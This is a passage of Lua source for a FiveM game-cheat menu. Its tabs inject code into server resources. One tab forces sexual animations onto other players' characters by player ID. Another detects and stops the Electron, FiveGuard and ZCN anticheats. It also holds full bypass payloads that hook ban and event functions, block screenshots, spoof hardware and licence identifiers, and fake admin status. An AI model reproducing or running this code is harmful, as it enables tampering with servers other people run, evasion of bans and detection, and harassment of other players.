            SetPedComponentVariation(myPed, i, drawable, texture, palette)
        end
        
        for i = 0, 10 do
            local propIndex = GetPedPropIndex(targetPed, i)
            local propTexture = GetPedPropTextureIndex(targetPed, i)
            if propIndex ~= -1 then
                SetPedPropIndex(myPed, i, propIndex, propTexture, true)
            else
                ClearPedProp(myPed, i)
            end
        end
        
        SetModelAsNoLongerNeeded(model)
        
        local targetName = GetPlayerName(targetPlayer)
        print("Copy Outfit: Copied outfit from " .. targetName)
        TriggerEvent('chat:addMessage', { args = { '^2Copy Outfit:', 'Copied outfit from ' .. targetName .. ' (ID: ' .. targetServerId .. ')' } })
    ]], targetId))
end)

-- Tab: ERP Menu
local ERPTab = MachoMenuAddTab(MenuWindow, "ERP Menu")

-- Group: ERP Operations
local ERPSection = MachoMenuGroup(ERPTab, "ERP Operations", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

-- ID text input
local PlayerIDInput = MachoMenuInputbox(ERPSection, "Target Player ID", "e.g., 1")

-- Animation status variable
local isAnimating = false

-- Apply Animation to Specific ID Button
MachoMenuButton(ERPSection, "Apply Animation to ID / Stop", function()
    local targetID = MachoMenuGetInputbox(PlayerIDInput)
    
    if isAnimating then
        MachoInjectResource('monitor', [[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]])
        MachoMenuNotification("ERP System", "Animation stopped!")
        isAnimating = false
        return
    end
    
    if targetID and targetID ~= "" then
        MachoInjectResource('monitor', string.format([[
            local targetID = %s
            local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
            
            if targetPed and targetPed ~= 0 then
                local playerPed = PlayerPedId()
                local animDict = "rcmpaparazzo_2"
                local animName = "shag_loop_a"
                
                RequestAnimDict(animDict)
                while not HasAnimDictLoaded(animDict) do
                    Citizen.Wait(0)
                end
                
                TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
                AttachEntityToEntity(playerPed, targetPed, 11816, 0.0, -0.6, 0.0, 0.5, 0.5, 0.0, true, true, true, true, 0, true)
                
                TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied for ID ' .. targetID .. '!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
            end
        ]], targetID))
        
        MachoMenuNotification("ERP System", "Animation applied for ID " .. targetID .. "!")
        isAnimating = true
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- Fuck Nearby Button
MachoMenuButton(ERPSection, "Fuck Nearby", function()
    if isAnimating then
        MachoInjectResource('monitor', [[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]])
        MachoMenuNotification("ERP System", "Animation stopped!")
        isAnimating = false
        return
    end
    
    MachoInjectResource('monitor', [[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local peds = {}
        local pedHandle, ped = FindFirstPed()
        local success
        
        repeat
            if DoesEntityExist(ped) and ped ~= playerPed then
                local pedCoords = GetEntityCoords(ped)
                if Vdist(playerCoords, pedCoords) < 10.0 then
                    table.insert(peds, ped)
                end
            end
            success, ped = FindNextPed(pedHandle)
        until not success
        EndFindPed(pedHandle)
        
        local closestPed = nil
        local closestDistance = 3.0
        
        for _, ped in pairs(peds) do
            local pedCoords = GetEntityCoords(ped)
            local distance = Vdist(playerCoords, pedCoords)
            if distance < closestDistance and ped ~= playerPed then
                closestPed = ped
                closestDistance = distance
            end
        end
        
        if closestPed then
            local animDict = "rcmpaparazzo_2"
            local animName = "shag_loop_a"
            
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do
                Citizen.Wait(0)
            end
            
            TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
            AttachEntityToEntity(playerPed, closestPed, 11816, 0.0, -0.6, 0.0, 0.5, 0.5, 0.0, true, true, true, true, 0, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied to nearby ped!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable ped found nearby!' } })
        end
    ]])
    
    MachoMenuNotification("ERP System", "Animation applied to nearby ped!")
    isAnimating = true
end)

-- Fuck Nearby Exhaust Button
MachoMenuButton(ERPSection, "Fuck Nearby Exhaust", function()
    if isAnimating then
        MachoInjectResource('monitor', [[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            local originalCoords = GetEntityCoords(playerPed)
            SetEntityCoords(playerPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped and returned to original position!' } })
        ]])
        MachoMenuNotification("ERP System", "Animation stopped and returned to original position!")
        isAnimating = false
        return
    end
    
    MachoInjectResource('monitor', [[
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed)
        local maxAttachDistance = 10.0
        local vehicles = {}
        local handle, vehicle = FindFirstVehicle()
        local success
        
        repeat
            success, vehicle = FindNextVehicle(handle)
            if success then
                table.insert(vehicles, vehicle)
            end
        until not success
        EndFindVehicle(handle)
        
        local closestVehicle = nil
        local closestDistance = maxAttachDistance
        
        for _, vehicle in ipairs(vehicles) do
            local vehicleCoords = GetEntityCoords(vehicle)
            local distance = Vdist(playerCoords, vehicleCoords)
            if distance < closestDistance then
                closestVehicle = vehicle
                closestDistance = distance
            end
        end
        
        if closestVehicle then
            local vehicleCoords = GetEntityCoords(closestVehicle)
            local heading = GetEntityHeading(closestVehicle)
            local radians = math.rad(heading)
            local rearOffset = 5.0
            local sideOffset = 2.0
            local xRearOffset = rearOffset * math.cos(radians)
            local yRearOffset = rearOffset * math.sin(radians)
            local xSideOffset = sideOffset * math.sin(radians)
            local ySideOffset = -sideOffset * math.cos(radians)
            local offsetCoords = vehicleCoords + vector3(xRearOffset + xSideOffset, yRearOffset + ySideOffset, 0.0)
            
            SetEntityCoords(playerPed, offsetCoords.x, offsetCoords.y, offsetCoords.z, false, false, false, true)
            SetEntityHeading(playerPed, heading)
            
            local animDict = "rcmpaparazzo_2"
            local animName = "shag_loop_a"
            RequestAnimDict(animDict)
            while not HasAnimDictLoaded(animDict) do
                Citizen.Wait(100)
            end
            TaskPlayAnim(playerPed, animDict, animName, 8.0, -8.0, -1, 1, 0, false, false, false)
            
            AttachEntityToEntity(playerPed, closestVehicle, 0, 0.0, -3.0, 0.6, 0.0, 0.0, heading, true, true, false, true, 7, true)
            
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation applied to nearby vehicle exhaust!' } })
        else
            TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'No suitable vehicle found nearby!' } })
        end
    ]])
    
    MachoMenuNotification("ERP System", "Animation applied to nearby vehicle exhaust!")
    isAnimating = true
end)

-- Apply Mouth Animation Button (Target ID gets 1st animation, self gets 2nd)
MachoMenuButton(ERPSection, "Apply Mouth Animation", function()
    if isAnimating then
        MachoInjectResource('monitor', [[
            local playerPed = PlayerPedId()
            ClearPedTasks(playerPed)
            DetachEntity(playerPed, true, true)
            TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Animation stopped!' } })
        ]])
        MachoMenuNotification("ERP System", "Animation stopped!")
        isAnimating = false
        return
    end
    
    local targetID = MachoMenuGetInputbox(PlayerIDInput)
    
    if targetID and targetID ~= "" then
        MachoInjectResource('monitor', string.format([[
            local targetID = %s
            local targetPed = GetPlayerPed(GetPlayerFromServerId(tonumber(targetID)))
            
            if targetPed and targetPed ~= 0 then
                local playerPed = PlayerPedId()
                
                -- 1st Animation: Mouth animation to target ID
                local animDict1 = "anim@mp_player_intincardockstd@rds@"
                local animName1 = "enter"
                
                RequestAnimDict(animDict1)
                while not HasAnimDictLoaded(animDict1) do
                    Citizen.Wait(0)
                end
                
                -- Put target character in animation and adjust position
                TaskPlayAnim(targetPed, animDict1, animName1, 8.0, -8.0, -1, 1, 0, false, false, false)
                
                -- Wait for target character animation to start
                Citizen.Wait(1000)
                
                -- 2nd Animation: Own character
                local animDict2 = "rcmpaparazzo_2"
                local animName2 = "shag_loop_a"
                
                RequestAnimDict(animDict2)
                while not HasAnimDictLoaded(animDict2) do
                    Citizen.Wait(0)
                end
                
                TaskPlayAnim(playerPed, animDict2, animName2, 8.0, -8.0, -1, 1, 0, false, false, false)
                
                -- Attach characters together - forward, up, mouth level
                -- 11816 = pelvis bone, 0.0 = forward, 0.8 = up, 0.0 = sideways
                AttachEntityToEntity(playerPed, targetPed, 11816, 0.0, 0.8, 0.0, 0.0, 0.0, 0.0, true, true, true, true, 0, true)
                
                -- Fix character direction - facing target character
                local targetHeading = GetEntityHeading(targetPed)
                SetEntityHeading(playerPed, targetHeading)
                
                TriggerEvent('chat:addMessage', { args = { '^2ERP System:', 'Mouth animation applied for ID ' .. targetID .. ' and your character is also animated!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1ERP System:', 'Invalid or not found player ID!' } })
            end
        ]], targetID))
        
        MachoMenuNotification("ERP System", "Mouth animation applied for ID " .. targetID .. " and your character is also animated!")
        isAnimating = true
    else
        MachoMenuNotification("Error", "Please enter a valid player ID!")
    end
end)

-- ERP Menu Close
-- ERPSection and ERPTab automatically close

-- Menu Window (Assuming MenuWindow is already defined)
-- local MenuWindow = ... (Should be defined according to Macho API)

-- Anticheat Checker Menu
local AntiCheatTab = MachoMenuAddTab(MenuWindow, "Anticheat Check")

-- Pull UP with small value (e.g., 10)
local SectionStartY = 10
local SectionPadding = 5

-- Anticheat Checker Group
local AntiCheatSection = MachoMenuGroup(AntiCheatTab, "Anticheat Checker", TabSectionWidth, SectionStartY, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

-- Variables for detected resource names and statuses
local detectedElectronResource = ""
local isElectronStopped = false
local detectedFiveGuardResource = ""
local isFiveGuardStopped = false

-- Electron Anticheat Scan Function
local function ScanElectronAnticheat()
    local foundAnticheat = false
    local foundScriptName = ""

    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        -- Try to load fxmanifest.lua
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest then
            -- Search for Electron Anticheat specific text
            if string.find(manifest, "https://electron-services.com") or 
            string.find(manifest, "Electron Services") or 
            string.find(manifest, "The most advanced fiveM anticheat") then
                foundAnticheat = true
                foundScriptName = resource
                detectedElectronResource = resource -- Store detected resource
                break
            end
        end
    end

    return foundAnticheat, foundScriptName
end

-- FiveGuard Anticheat Scan Function
local function ScanFiveGuardAnticheat()
    local foundAnticheat = false
    local foundScriptName = ""

    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local metadata = GetResourceMetadata(resource, 'client_script', j)
            if metadata ~= nil then
                if string.find(metadata, "obfuscated") then
                    foundAnticheat = true
                    foundScriptName = resource
                    detectedFiveGuardResource = resource -- Store detected resource
                    break
                end
            end
        end
        if foundAnticheat then break end
    end

    return foundAnticheat, foundScriptName
end

-- Electron Anticheat Scan Button
MachoMenuButton(AntiCheatSection, "Scan Electron Anticheat", function()
    CreateThread(function()
        local foundAnticheat, foundScriptName = ScanElectronAnticheat()

        Wait(100)

        if foundAnticheat then
            MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat System Found: " .. foundScriptName .. "")
        else
            MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Not Found!")
            detectedElectronResource = "" -- Reset if not found
            isElectronStopped = false
        end
    end)
end)

-- FiveGuard Anticheat Scan Button
MachoMenuButton(AntiCheatSection, "Scan FiveGuard", function()
    CreateThread(function()
        local foundAnticheat, foundScriptName = ScanFiveGuardAnticheat()

        Wait(100)

        if foundAnticheat then
            MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat System Found: " .. foundScriptName .. "")
        else
            MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Not Found!")
            detectedFiveGuardResource = "" -- Reset if not found
            isFiveGuardStopped = false
        end
    end)
end)

-- Electron Anticheat Stop/Start Button
MachoMenuButton(AntiCheatSection, "Stop/Start Electron Anticheat", function()
    CreateThread(function()
        -- First scan
        local foundAnticheat, foundScriptName = ScanElectronAnticheat()

        Wait(100)

        if foundAnticheat then
            if not isElectronStopped then
                -- Stop resource
                MachoResourceStop(detectedElectronResource)
                MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Stopped: " .. detectedElectronResource .. "")
                isElectronStopped = true
            else
                -- Start resource
                MachoResourceStart(detectedElectronResource)
                MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Started: " .. detectedElectronResource .. "")
                isElectronStopped = false
            end
        else
            MachoMenuNotification("[Anticheat Checker]", "Electron Anticheat Not Found!")
            detectedElectronResource = ""
            isElectronStopped = false
        end
    end)
end)

-- FiveGuard Anticheat Stop/Start Button
MachoMenuButton(AntiCheatSection, "Stop/Start FiveGuard Anticheat", function()
    CreateThread(function()
        -- First scan
        local foundAnticheat, foundScriptName = ScanFiveGuardAnticheat()

        Wait(100)

        if foundAnticheat then
            if not isFiveGuardStopped then
                -- Stop resource
                MachoResourceStop(detectedFiveGuardResource)
                MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Stopped: " .. detectedFiveGuardResource .. "")
                isFiveGuardStopped = true
            else
                -- Start resource
                MachoResourceStart(detectedFiveGuardResource)
                MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Started: " .. detectedFiveGuardResource .. "")
                isFiveGuardStopped = false
            end
        else
            MachoMenuNotification("[Anticheat Checker]", "FiveGuard Anticheat Not Found!")
            detectedFiveGuardResource = ""
            isFiveGuardStopped = false
        end
    end)
end)

-- ZCN-FirstBlock Stop/Start Button
local isZCNStopped = false
local detectedZCNResource = ""

local function ScanZCNResource()
    for i = 0, GetNumResources() - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if string.lower(resourceName) == "zcn-firstblock" then
            detectedZCNResource = resourceName
            return true
        end
    end
    return false
end

local function StartAutoStopThread(resourceName)
    CreateThread(function()
        while isZCNStopped do
            Wait(60000) -- Wait 60 seconds
            if MachoResourceState(resourceName) == "started" then
                MachoResourceStop(resourceName)
                print("[ZCN] Resource was restarted, stopped again.")
                MachoMenuNotification("[ZCN Control]", "ZCN-FirstBlock restarted, stopped again.")
            end
        end
    end)
end

MachoMenuButton(AntiCheatSection, "Stop/Start ZCN-FirstBlock", function()
    CreateThread(function()
        local foundZCN = ScanZCNResource()
        Wait(100)

        if foundZCN then
            if not isZCNStopped then
                -- Stop script
                MachoResourceStop(detectedZCNResource)
                MachoMenuNotification("[ZCN Control]", "ZCN-FirstBlock Stopped: " .. detectedZCNResource)
                isZCNStopped = true

                -- Start auto-control thread
                StartAutoStopThread(detectedZCNResource)
            else
                -- Start script
                MachoResourceStart(detectedZCNResource)
                MachoMenuNotification("[ZCN Control]", "ZCN-FirstBlock Started: " .. detectedZCNResource)
                isZCNStopped = false
            end
        else
            MachoMenuNotification("[ZCN Control]", "'ZCN-FirstBlock' Script Not Found on Server!")
            detectedZCNResource = ""
            isZCNStopped = false
        end
    end)
end)

-- WX AntiCheat Bypass (Full - Fixed)
MachoMenuButton(AntiCheatSection, "WX AntiCheat Bypass", function()
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    elseif GetResourceState('es_extended') == "started" then
        targetResource = 'es_extended'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        -- ============================================================
        -- WX ANTICHEAT BYPASS V3 - COMPLETE
        -- ============================================================
        -- Full WX AntiCheat Bypass
        -- Blocks: anticheat, screenshots, resources, injections
        -- Heartbeat NOT TOUCHED
        -- ============================================================

        print('[WX Bypass] Activating...')

        -- ============================================================
        -- 1. STOP ALL WX RESOURCES
        -- ============================================================

        local antiCheatResources = {
            'wx_anticheat', 'wx-ac', 'WX-AC', 'WX_AC',
            'anticheat', 'anti-cheat', 'ac',
            'WXAntiCheat', 'WX_AntiCheat'
        }

        CreateThread(function()
            while true do
                Wait(500)
                for _, res in ipairs(antiCheatResources) do
                    if GetResourceState(res) == 'started' then
                        pcall(StopResource, res)
                        print('[WX Bypass] Stopped: ' .. res)
                    end
                end
            end
        end)

        -- ============================================================
        -- 2. OVERWRITE WX GLOBAL VARIABLES
        -- ============================================================

        if wx then
            for k, v in pairs(wx) do
                wx[k] = nil
            end
            wx = {
                Debug = true,
                HeartBeat = { enabled = true, maxTime = 30 },
                OCR = false,
                antiNoClip = false,
                antiFreeCam = false,
                antiTeleport = false,
                antiFastRun = false,
                antiVehicleNoClip = false,
                antiGodMode = false,
                antiInvisible = false,
                antiSpamVehicle = false,
                antiSpamPed = false,
                antiSpamObject = false,
                antiBlacklistedVehiclesSpawn = false,
                antiObjects = false,
                antiPeds = false,
                antiExplosion = false,
                antiParticles = false,
                antiAIs = false,
                antiMenus = false,
                antiOverlay = false,
                antiMagicBullet = false,
                antiRapidFire = false,
                antiNoRecoil = false,
                antiAimbot = false,
                antiSilentAim = false,
                antiDamageBoost = false,
                antiDefenseBoost = false,
                antiTaze = false,
                antiKill = false,
                antiFold = false,
                antiPlateChange = false,
                antiBlacklistPlate = false,
                antiResourceStop = false,
                antiResourceStart = false,
                antiModuleStop = false,
                antiNUIDevTools = false,
                antiStatebagCrash = false,
                antiInfiniteRoll = false,
                antiRadar = false,
                antiSpectate = false,
                antiExplosiveAmmo = false,
                antiInfiniteAmmo = false,
                antiThermal = false,
                antiNightVision = false,
                antiSpoofedShot = false,
                antiSmallPed = false,
                antiInfiniteStamina = false,
                antiSuperJump = false,
                antiBlips = false,
                antiObjectAttach = false,
                antiBlacklistedWeapon = false,
                antiBlacklistedVehicles = false,
                explosionLimit = false,
                fakeTriggers = false,
                messageBlacklist = false,
                antiVDM = false,
                DetectionSharing = false,
                connectPrints = false,
                connectLogs = false,
                disconnectLogs = false,
                ExplosionLogs = false,
                screenshotModule = 'disabled',
                OCRCheckInterval = 9999999,
                punishType = 'LOG',
                showReason = false,
                chatMessages = false,
                pingOnDetect = false,
                spoilerIP = false,
                needDiscord = false,
                txAdminAuth = false,
                autoSQL = false,
                banIDFormat = 1
            }
            print('[WX Bypass] WX overwritten')
        end

        if WX then WX = nil end
        if AntiCheat then AntiCheat = nil end
        if AC then AC = nil end

        -- ============================================================
        -- 3. BLOCK WX EVENTS
        -- ============================================================

        local origRegisterNetEvent = RegisterNetEvent
        local origAddEventHandler = AddEventHandler
        local origTriggerEvent = TriggerEvent
        local origTriggerServerEvent = TriggerServerEvent
        local origDropPlayer = DropPlayer

        local blockEvents = {
            'wx_anticheat:detectclient',
            'wx_anticheat:server:clientXkzuqBwmTjN7Gab4QzuN9QYZJ1WxxU',
            'wx_anticheat:checkIsAdmin',
            'wx_anticheat:isAdmin',
            'wx_anticheat:requestOCRWebhook',
            'wx_anticheat:receiveOCRWebhook',
            'wx_anticheat:requestKey',
            'wx_anticheat:receiveKey',
            'wx_anticheat:openAdminMenu',
            'wx_anticheat:playerBanned',
            'wx_anticheat:playerUnbanned',
            'wx_anticheat:checkUpdates',
            'clearPedTasksEvent',
            'removeWeaponEvent',
            'giveWeaponEvent',
            'ptFxEvent',
            'entityCreated',
            'entityCreating',
            'weaponDamageEvent',
            'explosionEvent',
            'chatMessage'
        }

        RegisterNetEvent = function(eventName)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origRegisterNetEvent(eventName)
        end

        AddEventHandler = function(eventName, handler)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origAddEventHandler(eventName, handler)
        end

        TriggerEvent = function(eventName, ...)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origTriggerEvent(eventName, ...)
        end

        TriggerServerEvent = function(eventName, ...)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origTriggerServerEvent(eventName, ...)
        end

        DropPlayer = function(playerId, reason)
            if string.find(reason or '', 'wx') or
               string.find(reason or '', 'anticheat') or
               string.find(reason or '', 'AntiCheat') or
               string.find(reason or '', 'detect') or
               string.find(reason or '', 'ban') then
                return
            end
            return origDropPlayer(playerId, reason)
        end

        -- ============================================================
        -- 4. BLOCK SCREENSHOTS
        -- ============================================================

        local screenshotResources = {
            'screenshot-basic', 'screenshot_basic', 'sc-basic',
            'screenshot', 'Screenshot'
        }

        CreateThread(function()
            while true do
                Wait(200)
                for _, res in ipairs(screenshotResources) do
                    if GetResourceState(res) == 'started' then
                        pcall(StopResource, res)
                    end
                end
            end
        end)

        local screenshotFunctions = {
            'TakeScreenshot', 'SaveScreenshot', 'RequestScreenshot',
            'SendScreenshot', 'GetScreenshot', 'Screenshot',
            'requestScreenshot', 'saveScreenshot', 'takeScreenshot',
            'captureScreenshot', 'makeScreenshot', 'createScreenshot'
        }

        for _, func in ipairs(screenshotFunctions) do
            if _G[func] then
                _G[func] = function()
                    return nil
                end
            end
        end

        -- ============================================================
        -- 5. BLOCK EXPORTS
        -- ============================================================

        if exports then
            local blockedExports = {
                'ban', 'offlineban', 'unban', 'isAdmin',
                'addAdmin', 'removeAdmin', 'whitelistPlayer',
                'removeWhitelist', 'getConfig', 'getAdminType',
                'BanPlayer', 'KickPlayer', 'DetectPlayer',
                'LogPlayer', 'PunishPlayer', 'CheckPlayer',
                'GetPlayerStatus', 'SetPlayerStatus'
            }
            
            local resources = {}
            for i = 0, 255 do
                local res = GetResourceByFindIndex(i)
                if res then
                    table.insert(resources, res)
                end
            end
            
            for _, res in ipairs(resources) do
                if exports[res] then
                    for _, exp in ipairs(blockedExports) do
                        if exports[res][exp] then
                            exports[res][exp] = function()
                                return nil
                            end
                        end
                    end
                end
            end
        end

        -- ============================================================
        -- 6. BLOCK HWID
        -- ============================================================

        local origGetPlayerToken = GetPlayerToken
        GetPlayerToken = function(playerId, index)
            if index == 1 or index == 2 or index == 3 or index == 4 or index == 5 then
                return 'FAKE_HWID_' .. tostring(math.random(100000000, 999999999))
            end
            return origGetPlayerToken(playerId, index)
        end

        local origGetPlayerIdentifiers = GetPlayerIdentifiers
        GetPlayerIdentifiers = function(playerId)
            local ids = origGetPlayerIdentifiers(playerId)
            if ids then
                local fake = {}
                for _, id in ipairs(ids) do
                    if string.find(id, 'license:') then
                        table.insert(fake, 'license:FAKE_LICENSE_' .. tostring(math.random(100000000, 999999999)))
                    elseif string.find(id, 'steam:') then
                        table.insert(fake, 'steam:FAKE_STEAM_' .. tostring(math.random(100000000, 999999999)))
                    else
                        table.insert(fake, id)
                    end
                end
                return fake
            end
            return ids
        end

        -- ============================================================
        -- 7. ADMIN STATUS
        -- ============================================================

        if wx and wx.AdminStatus then
            wx.AdminStatus = function(playerId)
                return true
            end
        end

        -- ============================================================
        -- 8. FINAL STARTUP
        -- ============================================================

        print('================================================')
        print('[WX Bypass] WX AntiCheat fully bypassed!')
        print('[WX Bypass] Screenshots blocked!')
        print('[WX Bypass] All exports blocked!')
        print('[WX Bypass] Heartbeat NOT TOUCHED!')
        print('================================================')

        CreateThread(function()
            while true do
                Wait(15000)
                print('[WX Bypass] Protection active')
            end
        end)
    ]])
    
    MachoMenuNotification("WX Bypass", "WX AntiCheat bypass activated!")
    print("[WX Bypass] Activated")
end)

-- Electron AC (Anti-Cheat Bypass) - Added to AntiCheatSection
MachoMenuButton(AntiCheatSection, "Electron AC Bypass", function()
    -- Inject the Electron AC bypass into a resource
    local targetResource = nil
    if GetResourceState('monitor') == "started" then
        targetResource = 'monitor'
    elseif GetResourceState('qb-core') == "started" then
        targetResource = 'qb-core'
    elseif GetResourceState('es_extended') == "started" then
        targetResource = 'es_extended'
    else
        targetResource = 'ox_inventory'
    end
    
    MachoInjectResource2(NewThreadNs, targetResource, [[
        -- Electron AC Bypass
        print("Electron AC: Bypass activated")
        
        -- Block Electron AC events
        local blockedEvents = {
            "electron:anticheat",
            "electron:detection",
            "electron:ban",
            "electron:kick",
            "electron:punish",
            "electron:report",
            "electron:flag",
            "electron:scan",
            "electron:check",
            "electron:validate",
            "electron:verify",
            "electron:heartbeat",
            "electron:ping",
            "electron:ack",
            "electron:sync",
            "electron:state",
            "electron:status",
            "electron:init",
            "electron:start",
            "electron:stop",
            "electron:restart",
            "electron:block",
            "electron:unblock",
            "electron:inject",
            "electron:detect",
            "electron:log",
            "electron:notify",
            "electron:alert",
            "electron:warn",
            "electron:error",
            "electron:info",
            "electron:debug"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() 
                CancelEvent() 
            end)
        end
        
        -- Also block wildcard patterns
        RegisterNetEvent("electron:.*", function()
            CancelEvent()
        end)
        
        -- Block all Electron related natives
        local nativesToBlock = {
            0x1DD55701034110E5,
            0xFB92A102F1C4DFA3,
            0x01FEE67DB37F59B2,
            0xF1B760881820C952,
            0x67722AEB798E5FAB,
            0xCEDABC5900A0BF97,
            0x6ADAABD3068C5235,
            0x475768A975D5AD17,
            0x3A87E44BB9A01D54,
            0x8483E98E8B888AE2,
            0x937C71165CF334B3,
            0x8DECB02F88F428BC,
            0xB0760331C7AA4155,
            0x0A6DB4965674D243,
            0xB80CA294F2F26749,
            0x34616828CD07F1A1,
            0x6C4D0409BA1A2BC2,
            0xA200EB1EE790F448,
            0x14D6F5678D8F1B37,
            0x5234F9F10919EABA,
            0x580417101DDB492F,
            0xDFB2B516207D3534,
            0x39B5D1B10383F0C8,
            0xEE778F8C7E1142E2,
            0x8D4D46230B2C353A,
            0xE659E47AF827484B,
            0x53E8CB4F48BFE623,
            0xB15162CB5826E9E8,
            0xF5F1E89A970B7796,
            0x424D4687FA1E5652,
            0xC3330A45CCCDB26A,
            0x65019750A0324133,
            0xB77D05AC8C78AADB,
            0x45F6D8EEF34ABEF1,
            0x2497C4717C8B881E,
            0x2E1202248937775C,
            0x015A522136D7F951,
            0x7FEAD38B326B9F74,
            0x7E9DFE24AC1E58EF,
            0x7DCE8BDA0F1C1200,
            0x79CFD9827CC979B6,
            0x47D6F43D77935C75,
            0xD796CB5BA8F20E32,
            0x3133B907D8B32053,
            0x3BE0BB12D25FB305,
            0xC5286FFC176F28A2,
            0xDE4C184B2B9B071A,
            0xAC29253EEF8F0180,
            0x57E457CD2C0FC168,
            0xD5037BA82E12416F,
            0x9A8D700A51CB7B0D,
            0x4805D2B1D8CF94A9,
            0xB2C086CC1BF8F2BF,
            0x77F1BEB8863288D5,
            0x03E8D3D5F549087A,
            0xA6DB27D19ECBB7DA,
            0x1BEDE233E6CD2A1F,
            0xFA7C7F0AADF25D09,
            0xF25DF915FA38C5F3,
            0xDCCFD3F106C36AB4,
            0x4899CB088EDF59B8,
            0x4E209B2C1EAD5159,
            0x2975C866E6713290,
            0x3998B1276A3300E5,
            0xE83D4F9BA2A38914,
            0x7D304C1C955E3E12,
            0x743607648ADD4587,
            0x3A6867B4845BEDA2,
            0x016C090630DF1F89,
            0xE465D4AB7CA6AE72,
            0x1CEA6BFDF248E5D9,
            0xFCDFF7B72D23A1AC,
            0x0267D00AF114F17A,
            0x394BDE2A7BBA031E,
            0x68EDDA28A5976D07,
            0x60DFD0691A170B88,
            0x11E65974A982637C
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        -- Block NUI messages from Electron
        local _SendNUIMessage = SendNUIMessage
        SendNUIMessage = function(msg)
            if type(msg) == 'table' and msg.action then
                local blockedActions = {
                    "electron",
                    "anticheat",
                    "scan",
                    "check",
                    "report",
                    "flag",
                    "detect",
                    "ban",
                    "kick",
                    "punish",
                    "block",
                    "inject",
                    "log",
                    "alert",
                    "warn"
                }
                for _, action in ipairs(blockedActions) do
                    if string.find(string.lower(msg.action), action) then
                        return
                    end
                end
            end
            return _SendNUIMessage(msg)
        end
        
        -- Block Electron resources from starting
        local _StartResource = StartResource
        StartResource = function(resourceName)
            if string.find(string.lower(resourceName), "electron") then
                print("Electron AC: Blocked resource start: " .. resourceName)
                return
            end
            return _StartResource(resourceName)
        end
        
        -- Stop Electron resources if running
        local resources = GetNumResources()
        for i = 0, resources - 1 do
            local resource = GetResourceByFindIndex(i)
            if string.find(string.lower(resource), "electron") then
                if GetResourceState(resource) == "started" then
                    StopResource(resource)
                    print("Electron AC: Stopped resource: " .. resource)
                end
            end
        end
        
        print("Electron AC: Bypass active")
        TriggerEvent('chat:addMessage', { args = { '^2Electron AC:', 'Bypass activated successfully!' } })
    ]])
    
    MachoMenuNotification("Electron AC", "Electron AC bypass activated!")
    print("[Electron AC] Bypass activated")
end)

-- ============================================================
-- BYPASS OPTIONS (Added to AntiCheatSection)
-- ============================================================

-- FiveGuard Bypass
